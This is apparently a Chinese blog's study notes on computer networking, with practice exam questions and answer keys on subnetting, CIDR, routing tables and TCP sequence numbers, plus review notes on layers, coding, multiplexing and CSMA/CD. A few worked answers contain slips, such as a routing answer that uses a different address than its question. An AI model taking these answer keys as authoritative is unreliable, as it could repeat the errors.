）。<br>A、212.110.24.168<br>B、212.110.0.0<br>C、212.110.24.160<br>D、212.110.24.0</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>5位作为主机位，$169=(10101001)_2$，保留前3位后$(10100000)_2=160$</p>              </div>            </details></li><li><p>在192.168.10.33 255.255.255.248这个网络里，广播地址是（）<br>A. 192.168.10.40<br>B. 192.168.10.255<br>C. 192.168.255.255<br>D. 192.168.10.39</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>D</p><p>需要借用5位作为子网划分位，$2^5=32$个子网；每个子网块大小为$2^3=8$</p><p>用IP地址与子网掩码得出当前子网号为192.168.10.32，下一个子网为192.168.10.40，所以当前子网广播地址为192.168.10.39</p>              </div>            </details></li><li><p>把网络202.112.78.0划分为多个子网（子网掩码是255.255.255.192），则各子网中可用的主机地址总数是（    ）<br>A、64<br>B、128<br>C、126<br>D、62</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div></li><li><p>某公司申请到一个C类网络，由于有地理位置上的考虑必须切割成5个子网，请问子网掩码要设为（   ）。<br>A、255.255.255.224<br>B、255.255.255.192<br>C、255.255.255.254<br>D、255.285.255.240</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：A</p></div></div></li><li><p>IP地址67.198.30.120/30的子网掩码是（  ）。<br>A、255.255.255.252<br>B、255.255.0.0<br>C、255.255.255.240<br>D、255.255.255.0</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>A</p><p>剩余2位用来分配主机，子网分配使用6位，$(11111100)_2=252$</p>              </div>            </details></li><li><p>IP地址40.178.30.120/30的子网号位数是（   ）。<br>A、30<br>B、22<br>C、16<br>D、8</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>B</p><p>A类IP地址的默认掩码是8位，子网号位数为30-8=22位</p>              </div>            </details></li><li><p>某网络192.168.0.0，要划分4个子网，试回答下面问题。</p><p>子网掩码为？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：255.255.255.192</p></div></div><p>第一个子网地址？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：192.168.0.0</p></div></div><p>第一个子网的广播地址？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：192.168.0.63</p></div></div><p>第二个子网地址？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：192.168.0.64</p></div></div><p>第三个子网的第一个有效IP地址？</p><div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：192.168.0.129</p></div></div></li><li><p>一个公司申请到C类IP为198.166.1.0，需要划分8个子网，请分析各子网地址分配情况？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>分析：该公司需要有8个子网，加上子网号全 0 和全1的两种特殊地址，子网数量至少为 8；</p><ol><li><p>确定子网号的位长为3，可以用来分配的子网最多为8，满足用户要求。</p></li><li><p>子网掩码：由于划分8个子网，需在IP地址的第4字节划出3位供分配子网用，故子网掩码为：255.255.255.224；可用主机号5位。</p></li><li><p>地址分配：</p><table><thead><tr><th>子网地址</th><th>子网号</th><th>主机号</th><th>地址范围</th></tr></thead><tbody><tr><td>198.166.1.0</td><td>000</td><td>00001-11110</td><td>1-30</td></tr><tr><td>198.166.1.32</td><td>001</td><td>00001-11110</td><td>33-62</td></tr><tr><td>198.166.1.64</td><td>010</td><td>00001-11110</td><td>65-94</td></tr><tr><td>198.166.1.96</td><td>011</td><td>00001-11110</td><td>97-126</td></tr><tr><td>198.166.1.128</td><td>100</td><td>00001-11110</td><td>129-158</td></tr><tr><td>198.166.1.160</td><td>101</td><td>00001-11110</td><td>161-190</td></tr><tr><td>198.166.1.192</td><td>110</td><td>00001-11110</td><td>193-222</td></tr><tr><td>198.166.1.224</td><td>111</td><td>00001-11110</td><td>225-254</td></tr></tbody></table></li></ol>              </div>            </details></li><li><p>一个大型跨国公司的管理者向网络管理中心申请获得一个  A类IP地址121.0.0.0，需要划分1000个子网，请分析各子网地址分配情况？ 并设计2个广播地址：第1个子网的广播地址和全子网广播地址。</p>  <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>该公司需要有1000个物理网络，确定子网号的位长为10，可以用来分配的子网最多为1024，满足用户要求。 确定子网掩码：</p><img src="https://oss.iuoyt.com/img/posts/image-20240703160617696.png" alt="image-20240703160617696" style="zoom:33%;" /><ol><li><p>第一个子网</p><p>地址：121.0.0.0（121.<strong>00000000</strong>.<strong>00</strong>000000.00000000）</p><p>有效地址：121.0.0.1-121.0.63.254（121.<strong>00000000</strong>.<strong>00</strong>000000.00000001-121.<strong>00000000</strong>.<strong>00</strong>111111.11111110）</p><p>广播地址：121.0.63.255（121.<strong>00000000</strong>.<strong>00</strong>111111.11111111）</p></li><li><p>第二个子网：</p><p>地址：121.0.64.0（121.<strong>00000000</strong>.<strong>01</strong>000000.00000000）</p><p>有效地址：121.0.64.1-121.0.127.254（121.<strong>00000000</strong>.<strong>01</strong>000000.00000001-121.<strong>00000000</strong>. <strong>01</strong>111111.11111110）</p></li><li><p>全子网广播地址：121.255.255.255（121.11111111.11111111.11111111）</p></li></ol>              </div>            </details></li><li><p>给定IP地址167.77.88.99和掩码255.255.255.192，子网号是什么？广播地址是什么？该子网有效IP地址范围？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>子网号=IP地址 AND 掩码<br>即：167.77.88.99逻辑与 255.255.255.192=167.77.88.64<br>广播地址：167.77.88.127<br>有效ip地址：167.77.88.65 ----- 167.77.88.126</p>              </div>            </details></li><li><p>某企业内部网络中有一台机器，其IP协议的设置如下：IP地址：172.16.1.10; 子网掩码：255.255.255.224; 网关：172.16.1.1。回答以下问题：<br>1)这台机器的IP地址是哪一类？<br>2)该子网网络地址是什么？广播地址是哪个<br>3)该子网与外网连接的路由器IP地址是？<br>4)该子网可用的IP地址数为多少？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>1）IP地址属于B类<br>2）网络地址是172.16.1.0  广播地址是172.16.1.31<br>3）该子网与外网连接的路由器IP地址是172.16.1.1<br>4）可用的IP的地址有30个</p>              </div>            </details></li><li><p>某单位分配到一个C类地址  201.222.5.0。假设需要20个子网，每个子网有5台主机。<br>1）子网掩码是什么？<br>2）每个子网中的主机数最多为多少台？<br>3）请列出第一个子网地址和其广播地址。<br>4）请列出第三个子网的起止有效IP地址。</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>1）最后一个字节8位中选择5位作为子网划分位，则可允许有20个子网。子网掩码为：255.255.255.248<br>2）剩余主机位为3，每个子网主机数最多可有$2^3-2=6$台，满足。<br>3）第一个子网地址为：201.222.5.0<br>第一个子网的广播地址为：201.222.5.7<br>4）第三个子网地址的有效起止IP地址为：201.222.5.16<br>子网中的主机地址为201.222.5.17~201.222.5.22</p>              </div>            </details></li><li><p>R2路由表的信息是？</p><img src="https://oss.iuoyt.com/img/posts/image-20240703164109653.png" alt="image-20240703164109653" style="zoom:33%;" /> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <table><thead><tr><th style="text-align:center">目的网络地址</th><th style="text-align:center">子网掩码</th><th style="text-align:center">下一跳地址</th></tr></thead><tbody><tr><td style="text-align:center">172.31.33.128</td><td style="text-align:center">255.255.255.128</td><td style="text-align:center">R1 172.31.33.1</td></tr><tr><td style="text-align:center">172.31.33.0</td><td style="text-align:center">255.255.255.128</td><td style="text-align:center">接口0 直接投递</td></tr><tr><td style="text-align:center">172.31.20.0</td><td style="text-align:center">255.255.255.0</td><td style="text-align:center">接口1 直接投递</td></tr></tbody></table>              </div>            </details></li><li><p>设某路由器R建立了如下路由表如表1，此路由器可以直接从接口0和接口1转发分组，也可以通过相邻的路由器R2，R3和R4进行转发。</p><table><thead><tr><th>目的网络</th><th>子网掩码</th><th>下一站</th></tr></thead><tbody><tr><td>216.28.36.0</td><td>255.255.255.128</td><td>接口0</td></tr><tr><td>216.48.36.128</td><td>255.255.255.128</td><td>接口1</td></tr><tr><td>216.48.40.0</td><td>255.255.255.128</td><td>R2</td></tr><tr><td>182.12.234.0</td><td>255.255.255.128</td><td>R3</td></tr><tr><td>*（默认）</td><td></td><td>R4</td></tr></tbody></table><p>现共收到5个分组，请分别计算其下一站，各目的站的IP地址分别为：<br>（1）216.48.36.137</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：分组的目的站IP地址为：216.48.36.137。先与子网掩码255.255.255.128相与，得216.48.36.128，可见该分组经接口1转发。</p></div></div><p>（2）216.48.40.151</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：分组的目的IP地址为：216.48.40.163，与子网掩码255.255.255.128相与后得216.48.40.128，与子网掩码255.255.255.192相与后得216.48.40.128，经查路由表知，该分组转发选择默认路由，经R4转发。</p></div></div><p>（3）216.48.40.36</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：分组的目的IP地址为：216.48.40.36。与子网掩码255.255.255.128相与得216.48.40.0，经查路由表可知，该项分组经R2转发。</p></div></div><p>（4）182.12.234.68</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：分组的目的IP地址为：182.12.234.68，与子网掩码255.255.255.128相与后得182.12.234.0。与子网掩码255.255.255.192相与后得182.12.234.64，经查路由表知，该分组转发选择默认路由，经R4转发。</p></div></div><p>（5）182.12.234.23</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：分组的目的IP地址为：182.12.234.23。与子网掩码255.255.255.128相与后得182.12.234.0。与子网掩码255.255.255.192相与后得182.12.234.0，经查路由表知，该分组经R3转发。</p></div></div></li></ol><h3 id="CIDR">CIDR</h3><ol><li><p>IP地址为128.14.35.7/20，该地址所在地址块中的最小和最大地址、地址块中的地址数分别是多少？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>128.14.35.7/20=<strong>10000000 00001110 0010</strong>0011 00000111</p><p>网络前缀为前20位，后12位为主机号，128.14.32.0/20</p><p>该地址所在地址块中的最小和最大地址分别为：</p><ul><li>最小地址 128.14.32.0 10000000 00001110 00100000 00000000</li><li>最大地址 128.14.47.255 10000000 00001110 00101111 11111111</li></ul><p>主机号为全0或全1一般不使用，通常使用这两个地址之间的地址，这个地址块中一共包含有$2^{12}$个地址</p>              </div>            </details></li><li><p>网络122.21.136.0/24和122.21.143.0/24，经过路由汇聚，得到的网络地址是（）？</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：122.21.136.0/21<br>136的二进制为10001000，143的二进制为10001111，所以取前2字节，一直到第三字节的10001，第三段后面三位为000。</p></div></div></li><li><p>属于网络112.10.200.0/21的地址是：<br>A. 112.10.198.0<br>B. 112.10.206.0      <br>C. 112.10.217.0<br>D. 112.10.224.0</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：B。第三段200的二进制为11001000，取21位则第三段取前五位，B选项的206的二进制为11001110。</p></div></div></li><li><p>假设TCP/IP参考模型的应用层欲发送500B的数据（无拆分），除网络接口层和应用层之外，其他各层在封装PDU时均引入20B的额外开销，则应用层的数据传输效率为（    ）</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：92.6%。传输数据500B，实际传输数据为500+20+20=540B，所以，数据传输效率为：500/540=92.6%。</p></div></div></li></ol><h3 id="构造超网">构造超网</h3><ol><li><p>有如下的4个/24地址块，试进行最大可能性的聚合<br>①212.56.132.0/24<br>②212.56.133.0/24<br>③212.56.134.0/24<br>④212.56.135.0/24</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>$212= (11010100)_2，56= (00111000)_2$<br>$132= ($<span style="color:red">$100001$</span>$00)_2$<br>$133= ($<span style="color:red">$100001$</span>$01)_2$<br>$134= ($<span style="color:red">$100001$</span>$10)_2$<br>$135= ($<span style="color:red">$100001$</span>$11)_2$</p><p>所以共同的前缀有22位，即11010100 00111000 100001，聚合的CIDR地址块是： 212.56.132.0/22</p>              </div>            </details></li><li><p>设有2条路由21.1.193.0/24和21.1.194.0/24，如果进行路由汇聚，覆盖这2条路由的地址是（     ）。<br>A、21.1.200.0/22<br>B、21.1.192.0/23<br>C、21.1.192.0/21<br>D、21.1.224.0/20</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>$193=(11000001)_2$<br>$194=(11000010)_2$​​</p><p>$192= ($<span style="color:red">$110000$</span>$00)_2$</p>              </div>            </details></li></ol><h2 id="第五章-运输层">第五章 运输层</h2><ol><li><p>TCP发送一段数据报，其序号是35～150，如果正确到达，接收方对其确认的序号为（    ）。<br>A. 36<br>B. 150<br>C. 35<br>D. 151</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div></li><li><p>主机A通过TCP连接向主机B连续发送两个TCP数据报，第一个数据报序号为20，第一个数据报序号为80，则<br>（1）第一个数据报中有多少数据？<br>（2）假定第一段数据报丢失而第二段报文到达主机B，B发往主机A的确认报文中确认号应该是多少？</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <ol><li>80-20=60字节</li><li>确认号为20</li></ol>              </div>            </details></li><li><p>主机甲与主机乙之间建立了一个TCP连接，主机甲向主机乙发送了3个连续的TCP段，分别包含300B，400B和500B的有效载荷，第3个段的序号为900，若主机乙仅正确收到第1和第3个段，则主机乙发送给主机甲的确认序号是多少？<br>A、300<br>B、1200<br>C、500<br>D、1400</p> <details class="folding-tag" ><summary> 查看答案 </summary>              <div class='content'>              <p>C</p><p>从 “第3个段的序号为900 “，可以推断出初始序列号是$900-(300+400)=200$，所以，第二个数据段的序列号应该是$200+300=500$。第二个数据段没有被B正确接收，所以B的ACK=500，告诉A从500序列号开始传输。</p>              </div>            </details></li><li><p>当 TCP 接收端获得一个有效载荷大小 是1000和序列号为8000 的数据段时，有效载荷中的最后一个字节相关联的序列号是多少？<br>A、9000<br>B、8000<br>C、7999<br>D、8999</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：D</p></div></div></li><li><p>若B正确收到了A发送过来的一个报文段，其序号字段值是301，而数据长度是200字节，则B发送给A的确认报文中确认号为（）<br>A. 301<br>B. 500<br>C. 501<br>D. 200</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div></li><li><p>当（）时，表明这是一个连接请求报文段。<br>A. SYN=0,ACK=0<br>B. SYN=0,ACK=1<br>C. SYN=1,ACK=0<br>D. SYN=1,ACK=1</p> <div class="hide-block"><button type="button" class="hide-button" style="">查看答案    </button><div class="hide-content"><p>参考答案：C</p></div></div></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络期末重点整理</title>
      <link href="/posts/4b6174b7.html"/>
      <url>/posts/4b6174b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一章-概论">第一章 概论</h2><h3 id="体系结构">体系结构</h3><img src="https://oss.iuoyt.com/img/posts/1710256503553.jpg" alt="计算机网络五层体系结构" style="zoom: 67%;" /><h4 id="五层体系结构">五层体系结构</h4><ul><li><p>OSI 的七层协议体系结构的概念清楚，理论也较完整，但它既复杂又不实用。</p></li><li><p>TCP/IP 是四层体系结构，但最下面的网络接口层并没有具体内容。</p></li><li><p>在学习计算机网络原理时往往采取折中的办法，即综合 OSI 和 TCP/IP 的优点，采用一种只有五层协议的体系结构 。</p></li></ul><h4 id="OSI七层协议体系结构">OSI七层协议体系结构</h4><ul><li><strong>物理层</strong>：利用传输介质为通信的网络结点之间建立、管理和释放物理连接；实现比特流的透明传输，为数据链路层提供数据传输服务；物理层的数据传输单元是比特。</li><li><strong>数据链路层</strong>：在物理层提供的服务基础上，数据链路层在通信的实体间建立数据链路连接；传输以“帧”为单位的数据包；采用差错控制与流量控制方法，使有差错的物理线路变成无差错的数据链路。</li><li><strong>网络层</strong>：通过路由选择算法为分组通过通信子网选择最适当的路径；为数据在结点之间传输创建逻辑链路；实现拥塞控制、网络互连等功能。</li><li><strong>传输层</strong>：可提供可靠端到端（end-to-end）服务；处理数据包错误、数据包次序，以及其他一些关键传输问题；传输层向高层屏蔽了下层数据通信的细节，是计算机通信体系结构中关键的一层。</li><li><strong>会话层</strong>：负责维护两个结点之间的传输链接，以便确保点对点传输不中断，管理数据交换。</li><li><strong>表示层</strong>：用于处理在两个通信系统中交换信息的表示方式，数据格式变换、数据加密与解密、数据压缩与恢复。</li><li><strong>应用层</strong>：为应用程序提供了网络服务；应用层需要识别并保证通信对方的可用性，使得协同工作的应用程序之间的同步；建立传输错误纠正与保证数据完整性的控制机制。</li></ul><h3 id="服务与协议">服务与协议</h3><ul><li>协议：控制两个对等实体（或多个实体）进行通信的规则的集合</li><li>在协议的控制下，两个对等实体间的通信使得本层能向上一层提供服务。要实现本层协议，还需要使用下面一层所提供的服务。协议可以向上提供服务，而被服务的实体无法看到具体的协议。即<strong>协议是“水平的”</strong>（控制对等实体之间通信的规则），<strong>服务是“垂直的”</strong>（服务是由下层向上层通过层间接口提供的）。</li></ul><h3 id="交换技术">交换技术</h3><h4 id="电路交换">电路交换</h4><ul><li><p>必须经过“建立连接（占用通信资源）→通话（一直占用通信资源）→释放连接（归还通信资源）”三个步骤的交换方式称为电路交换。</p><img src="https://oss.iuoyt.com/img/posts/1709786985605.jpg" alt="电路交换" style="zoom: 67%;" /></li><li><p>特点：</p><ul><li>突发性：数据是突发式地出现在传输线路上的</li><li>利用率低：线路上真正用来传送数据的时间往往不到10%甚至1%，已被用户占用的通信线路资源在绝大部分时间里都是空闲的。</li></ul></li></ul><h4 id="分组交换">分组交换</h4><ul><li><p>分组交换采用存储转发技术，把一个报文划分为几个分组后再进行传送。每一个数据段前面都会加上一些必要的控制信息组成首部（header），包括目的地址、源地址等重要信息。</p><img src="https://oss.iuoyt.com/img/posts/1709787209313.jpg" alt="分组" style="zoom: 50%;" /></li><li><p>分组交换网中的结点交换机根据收到的分组首部中的地址信息，把分组转发到下一个结点交换机。每个分组在互联网中独立地选择传输路径。用这样的存储转发方式，最后分组就能到达最终目的地。</p><img src="https://oss.iuoyt.com/img/posts/1709787122005.jpg" alt="分组交换" style="zoom:67%;" /></li><li><p>优点：</p><ul><li>高效：再分组传输的过程中动态分配传输带宽，对通信链路逐段占用</li><li>灵活：为每一个分组独立地选择最合适的转发路由</li><li>迅速：以分组作为传送单位，不先建立连接就能向其他主机发送分组</li><li>可靠：保证可靠性的网络协议，分布式多路由的分组交换网使得网络有很好的生存性</li></ul></li><li><p>缺点：</p><ul><li>造成一定的时延：分组在各路由器存储转发时需要排队</li><li>造成一定的开销：数据在转发过程中可能会丢失</li></ul></li></ul><h4 id="交换方式的对比">交换方式的对比</h4><ul><li><p>若要连续传送大量的数据，且其传送时间远大于连接建立时间，则电路交换的传输速率较快。</p></li><li><p>报文交换和分组交换不需要预先分配传输带宽，在传送突发数据时可提高整个网络的信道利用率。</p></li><li><p>由于一个分组的长度往往远小于整个报文的长度，因此分组交换比报文交换的时延小，同时也具有更好的灵活性。</p></li></ul><img src="https://oss.iuoyt.com/img/posts/1709787450436.jpg" alt="三种交换方式" style="zoom:67%;" /><h2 id="第二章-物理层">第二章 物理层</h2><h3 id="编码-解码">编码-解码</h3><ul><li><p>在发送端要将数字数据变换为数字信号，以便在数字通信系统中传输，这一过程称为编码。</p></li><li><p>在接收端，要将数字信号还原为原来的形式，这一过程称为解码。</p></li><li><p>最常用的数字信号编码技术有以下几种：</p><ul><li><p>不归零制：正电平代表 1，负电平代表 0。</p></li><li><p>归零制：正脉冲代表 1，负脉冲代表 0。</p></li><li><p>曼彻斯特编码：位周期中心的向上跳变代表 0，位周期中心的向下跳变代表 1。但也可反过来定义。（IEEE 802.3以太局域网标准编码）</p></li><li><p>差分曼彻斯特编码：在每一位的中心处始终都有跳变。位开始边界有跳变代表 0，而位开始边界没有跳变代表 1。（IEEE 802.5令牌环局域网标准编码）</p></li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240324160652163.png" alt="常用编码方式" style="zoom:50%;" /></li><li><p>每个码元中间都要发生跳变，接收端可将此变化提取出来作为同步信号，使接收端的时钟与发送设备的时钟保持一致。曼彻斯特编码也称为自同步码（即有<strong>自同步能力</strong>)。</p></li></ul><h3 id="调制-解调">调制-解调</h3><ul><li><p><strong>基带信号</strong>（基本频带信号）：来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号。基带信号往往包含有较多的低频成分，甚至有直流成分，而<strong>许多信道并不能传输这种低频分量或直流分量</strong>。因此必须对基带信号进行<strong>调制</strong>  (modulation)。调制分为两类：</p><ul><li><strong>基带调制</strong>：仅对基带信号的波形进行变换，使它能够与信道特性相适应。变换后的信号仍然是基带信号。把这种过程称为编码 (coding)。</li><li><strong>带通调制</strong>：使用载波 (carrier)进行调制，把基带信号的频率范围搬移到较高的频段，并转换为模拟信号，这样就能够更好地在模拟信道中传输（即仅在一段频率范围内能够通过信道） 。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240324161429461.png" alt="基带调制与带通调试" style="zoom:50%;" /></li><li><p>基本的带通调制方法</p><ul><li>调幅(AM)：载波的振幅随基带数字信号而变化。</li><li>调频(FM)：载波的频率随基带数字信号而变化。</li><li>调相(PM) ：载波的初始相位随基带数字信号而变化。</li></ul><img src="https://oss.iuoyt.com/img/posts/1711267850240.jpg" alt="带通调制方法" style="zoom: 67%;" /></li><li><p>脉冲编码调制（PCM）解调技术三步骤：</p><ul><li>采样：按一定间隔对语音信号进行采样</li><li>量化：对每个样本舍入到量化级别上</li><li>编码：对每个舍入后的样本进行编码</li></ul></li></ul><h3 id="通信方式">通信方式</h3><p>模拟数据和数字数据之间都可以用模拟信号或数字信号来表示，可以用其中任意一种形式传输。</p><img src="https://oss.iuoyt.com/img/posts/image-20240324155430823.png" alt="传输形式的转换" style="zoom:50%;" /><h3 id="复用技术">复用技术</h3><ul><li><strong>频分多路复用FDM</strong> (Frequency Division Multiplexing)，适合于<u>模拟信号的传输</u>，如电话系统、电视系统。</li><li><strong>时分多路复用TDM</strong>(Time Division Multiplexing)，适用于<u>数字信号的传输</u>，计算机网络中的数据突发性，应用异步时分多路复用技术</li><li><strong>波分多路复用WDM</strong> (Wave Division Multiplexing) ，应用于<u>全光纤组成的网络中</u>，传输的是光信号</li><li><strong>码分多路复用CDM</strong>(Code Division Multiplexing)，广泛应用于<u>移动通信和无线局域网</u>中</li></ul><h4 id="频分复用FDM">频分复用FDM</h4><ul><li>将整个带宽分为多份，用户在分配到一定的频带后，在通信过程中自始至终都占用这个频带。</li><li>频分复用的所有用户在同样的时间占用不同的带宽资源（频率带宽）。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414161226925.png" alt="频分复用" style="zoom:50%;" /><h4 id="时分复用TDM">时分复用TDM</h4><ul><li>时分复用则是将时间划分为一段段等长的时分复用帧（TDM帧）。每一个时分复用的用户在每一个 TDM 帧中占用固定序号的时隙，所有用户在不同的时间占用同样的频带宽度。</li><li>TDM 信号也称为等时 (isochronous) 信号。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414161509993.png" alt="时分复用" style="zoom:50%;" /><h4 id="统计时分复用STDM">统计时分复用STDM</h4><ul><li>按需动态地分配时隙。因此统计时分复用可以提高线路的利用率。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414162413297.png" alt="image-20240414162413297" style="zoom:50%;" /><h4 id="波分复用WDM">波分复用WDM</h4><ul><li>波分复用就是光的频分复用。使用一根光纤来同时传输多个光载波信号。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240414162514034.png" alt="波分复用" style="zoom: 50%;" /><h4 id="码分复用CDM">码分复用CDM</h4><ul><li>码分复用让每一个用户在同样的时间，使用同样的频带进行通信，各用户使用经过特殊挑选的不同码型（码分多址 CDMA (Code Division Multiple Access)），因此彼此不会造成干扰。</li><li>这种系统发送的信号有很强的抗干扰能力，其频谱类似于白噪声，不易被敌人发现。</li><li>每一个比特时间划分为 m 个短的间隔，即“码片”，使用CDMA的每一个站被指派一个唯一的m bit码片序列，一般是64或128。如发送比特1，则发送码片系列，发送0则发送码片序列的二进制反码。</li></ul><h3 id="传输介质">传输介质</h3><p>数据传输系统中在发送器和接收器之间的物理通路，是通信中实际传输信息的载体。传输介质（传输媒体）分为两大类：</p><ul><li>导引型传输媒体：电磁波被导引沿着固体媒体（铜线或光纤）传播。</li><li>非导引型传输媒体：即自由空间。在非导引型传输媒体中，电磁波的传输常称为无线传输。</li></ul><img src="https://oss.iuoyt.com/img/posts/1711283357948.jpg" alt="电信领域使用的电磁波的频谱" style="zoom: 67%;" /><h2 id="第三章-数据链路层">第三章 数据链路层</h2><h3 id="CSMA-CD">CSMA/CD</h3><ul><li>CSMA/CD 含义：载波监听多点接入 / 碰撞检测  (Carrier Sense Multiple Access with Collision Detection) 。“多点接入”表示许多计算机以多点接入的方式连接在一根总线上。“载波监听”是指每一个站在发送数据之前先要检测一下总线上是否有其他计算机在发送数据，如果有，则暂时不要发送数据，以免发生碰撞。 总线上并没有什么“载波”。因此， “载波监听”就是用电子技术检测总线上有没有其他计算机发送的数据信号。</li></ul><h4 id="工作过程">工作过程</h4><ol><li>先听后发</li><li>边听边发</li><li>冲突停止</li><li>随机延迟后重发</li></ol><img src="https://oss.iuoyt.com/img/posts/image-20240701140103724.png" alt="CSMA/CD工作流程" style="zoom:50%;" /><h4 id="争用期">争用期</h4><ul><li><p>最先发送数据帧的站，在发送数据帧后至多经过时间$2\tau$（两倍的端到端往返时延）就可知道发送的数据帧是否遭受了碰撞。以太网的端到端往返时延$2\tau$​称为争用期，或碰撞窗口。经过争用期这段时间还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</p><img src="https://oss.iuoyt.com/img/posts/image-20240701140535151.png" alt="在争用期内发生碰撞的情形" style="zoom:50%;" /></li></ul><h4 id="二进制指数退避算法">二进制指数退避算法</h4><ul><li><p>发生碰撞的站在停止发送数据后，要推迟（退避）一个随机时间才能再发送数据。</p><ul><li>基本退避时间取为争用期$2\tau$。</li><li>从整数集合$[0, 1, … , (2^k - 1)]$中随机地取出一个数，记为 r。重传所需的时延就是 r 倍的基本退避时间$r\times2\tau$。</li><li>参数 k 按公式计算：$k = min(重传次数, 10)$​，当 k ≤10 时，参数 k 等于重传次数。当重传达 16 次仍不能成功时即丢弃该帧，并向高层报告。</li></ul><details class="folding-tag" ><summary> 举例 </summary>              <div class='content'>              <ul><li>第 1 次冲突重传时：k = 1，r 为 {0，1} 集合中的任何一个数。</li><li>第 2 次冲突重传时：k = 2，r 为 {0，1，2，3} 集合中的任何一个数。</li><li>第 3 次冲突重传时：k = 3，r 为 {0，1，2，3，4，5，6，7} 集合中的任何一个数。</li></ul>              </div>            </details></li><li><p>10 Mbit/s 以太网取$51.2\mu s$为争用期的长度。对于 10 Mbit/s 以太网，在争用期内可发送 512 bit，即 64 字节。</p><div class="note info flat"><p>这意味着：以太网在发送数据时，若前 64 字节没有发生冲突，则后续的数据就不会发生冲突。</p></div><details class="folding-tag" ><summary> 例题 </summary>              <div class='content'>              <p>假定在使用CSMA/CD协议的10Mb/s以太网中某个站在发送数据时检测到碰撞，执行退避算法时选择了随机数r=100。试问这个站需要等待多长时间后才能再次发送数据？如果是100Mb/s的以太网呢？</p>  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><p>参考答案：对于10Mb/s的以太网，以太网把争用期定为51.2微秒，要退后100个争用期，等待时间是$51.2\mu s\times100=5.12ms$。</p><p>对于100Mb/s的以太网，以太网把争用期定为5.12微秒，要退后100个争用期，等待时间是$5.12\mu s \times100=512\mu s$</p></div></div>              </div>            </details></li></ul><h4 id="最短有效帧长">最短有效帧长</h4><ul><li><p>以太网规定了最短有效帧长为 64 字节，凡长度小于 64 字节的帧都是由于冲突而异常中止的无效帧。</p></li><li><p>如果发生冲突，就一定是在发送的前 64 字节之内。 由于一检测到冲突就立即中止发送，这时已经发送出去的数据一定小于 64 字节。</p><details class="folding-tag" ><summary> 例题 </summary>              <div class='content'>              <p>假定1km长的CSMA/CD网络的数据率为1Gb/s。设信号在网络上的传播速率为200000km/s。求能够使用此协议的最短帧长？</p>  <div class="hide-block"><button type="button" class="hide-button" style="">查看解答    </button><div class="hide-content"><p>参考答案：对于 1km 电缆，单程传播时间为$1÷200000=5\mu s$，往返传播时间为$10\mu s$。为了能够按照CSMA/CD工作，最小帧的发射时间不能小于$10\mu s$。以1Gb/s速率工作，$10\mu s$可以发送的比特数为$10\times10^{-6}s\times10^9bps=10000bit$，因此，最短帧是10000 位或 1250 字节长。</p></div></div>              </div>            </details></li></ul><h4 id="重要特性">重要特性</h4><ul><li>使用 CSMA/CD 协议的以太网不能进行全双工通信而只能进行双向交替通信（半双工通信）。</li><li>每个站在发送数据之后的一小段时间内，存在着遭遇碰撞的可能性。</li><li>这种发送的不确定性使整个以太网的平均通信量远小于以太网的最高数据率。</li></ul><h3 